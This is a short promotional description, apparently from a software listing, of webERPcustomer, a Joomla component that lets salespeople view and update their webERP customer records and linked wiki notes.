Description     :

webERPcustomer is a Joomla! component integrated with webERP. Upon logging in and clicking the webERPcustomer
menu selection the user/salesperson will be able to view and update webERP customer master records assigned
to them and access/update associated wiki data. webERPcustomer is an easy way to allow sales persons to update
their customer data.

The Joomla user name and webERP salesperson code must be the same and the Joomla database user must be given
rights to the webERP database.

webERP is an open source accounting package that is very popular. At Rockwall Computer we are writing modules
and components integrated with webERP so that companies can access and update data in webERP using Joomla modules
and components. This reduces training time and the user interface is more friendly and powerful.


For instance, this accounts receivable customer and branch record update is much easier to access than through webERP.
Clicking the note/pencil opens the webERP wiki notes for that customer. This method of access to a sales persons
including the wiki integration makes it very powerful!
